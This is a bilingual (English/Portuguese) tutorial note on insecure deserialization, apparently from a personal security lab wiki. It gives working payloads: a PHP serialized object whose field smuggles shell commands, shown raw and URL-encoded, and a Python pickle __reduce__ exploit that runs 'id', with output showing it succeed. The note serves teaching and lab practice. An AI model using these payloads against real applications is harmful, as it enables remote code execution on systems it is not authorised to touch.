# Insecure Deserialization

## What is serialization?

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:

* Write complex data to inter-process memory, a file, or a database
* Send complex data, for example, over a network, between different components of an application, or in an API call

Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.

object-1-image.jpg

Essa forma de compactação pode ser em dois tipos: binário ou human-readable. Os Binários são: Java serialization, python pickle, C++ Object Representationm, etc. Os Human-Readable são: JSON, XML, YAML, SOAP, PHP Serialization, etc.

Vamos ver um exemplo de como podemos serializar um objeto

```php
<?php

class Car
{
    public string $color = "White";
    public string $model = "Golf";
    public int $wheel = 4;

    public function accelerate()
    {
        echo "Accelerating the car...";
    }

    public function toBrake()
    {
        echo "Braking the car...";
    }
}

$myCar = new Car();
echo serialize($myCar);
```

Se rodarmos

```
$ php index.php 

O:3:"Car":3:{s:5:"color";s:5:"White";s:5:"model";s:4:"Golf";s:5:"wheel";i:4;}
```

TYPE:QTY:VALUE

## PHP

Nos exemplos a seguir, podemos ver que é possível explorar a insecure deserialization por causa do magic method `__destruct()`&#x20;

<figure><img src="../.gitbook/assets/php-1.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/php-2.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/php-3.png" alt=""><figcaption></figcaption></figure>

Com isso, podemos montar um array com um objeto serializado da classe FileManager, explorando the magic method `__destruct()` do PHP.

```php
<?php

class FileManager
{
    public $path = "/tmp/test/;mkdir /tmp/rce/; id>/tmp/rce/id.txt; echo";
}

echo serialize(array('payload' => new FileManager));
```

Irá exibir:

{% code overflow="wrap" fullWidth="false" %}
```
a:1:{s:7:"payload";O:11:"FileManager":1:{s:4:"path";s:52:"/tmp/test/;mkdir /tmp/rce/; id>/tmp/rce/id.txt; echo";}}
```
{% endcode %}

Porém, se enviarmos apenas esse payload não irá funcionar pois é chamado o método `isAuth()` e ela não existe na class `FileManager`. Com isso, uma forma de fazer ser chamado a função `__destruct()` (que é o que queremos), é gerar um erro inexperado. Podemos então alterar o array para duas posições e assim irá funcionar (lembrando que é necessário fazer o url encoding).

{% code overflow="wrap" fullWidth="false" %}
```
a:2:{s:7:"payload";O:11:"FileManager":1:{s:4:"path";s:52:"/tmp/test/;mkdir /tmp/rce/; id>/tmp/rce/id.txt; echo";}}
```
{% endcode %}

O payload final ficará assim:

{% code overflow="wrap" fullWidth="false" %}
```
a%3A2%3A%7Bs%3A7%3A%22payload%22%3BO%3A11%3A%22FileManager%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A52%3A%22%2Ftmp%2Ftest%2F%3Bmkdir%20%2Ftmp%2Frce%2F%3B%20id%3E%2Ftmp%2Frce%2Fid.txt%3B%20echo%22%3B%7D%7D
```
{% endcode %}

## Python

Em Python, nao e necessario ter aquela estrutura de destruct igual no php, basta ter um pickle.loads que conseguimos controlar o que e enviado e assim executar algum comando

```python
import pickle
import os

class exploit(object):
    def __reduce__(self):
        return (os.system, ('id', 'test'))

malicious_object = pickle.dumps(exploit())
print(malicious_object)
pickle.loads(malicious_object)
```

Temos: 

```
$ python3 exploity-id.py 

b'\x80\x04\x95$\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x8c\x04test\x94\x86\x94R\x94.'
Traceback (most recent call last):
  File "/home/nizyuu/Desktop/cybersec-labs/public/insecure-deserialization-python/exploity-id.py", line 10, in <module>
    pickle.loads(malicious_object)
TypeError: system() takes at most 1 argument (2 given)
```

Com isso, temos um erro porque e esperado que passe apenas um argumento na funcao `system` porem ao mesmo tempo e esperado que passe mais de um argumento para ser uma tupla. Podemos burlar isso apenas passando um paramentro e depois uma virgula, que assim ira ser uma tupla.

```
	return (os.system, ('id',))
```

Sucesso

```
$ python3 exploity-id.py
 
b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
uid=1000(nizyuu) gid=1000(nizyuu) groups=1000(nizyuu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
```

Com isso, podemos notar que em qualquer aplicacao python que estiver usando o `pickle.loads()` podemos enviar esse binario que conseguimos executar o comando id.

{% code overflow="wrap" fullWidth="false" %}
```python
import pickle

import os

pickle.loads(b"\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.")
```
{% endcode %}

Executamos

```
$ python3 exploity-id.py 

uid=1000(nizyuu) gid=1000(nizyuu) groups=1000(nizyuu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
```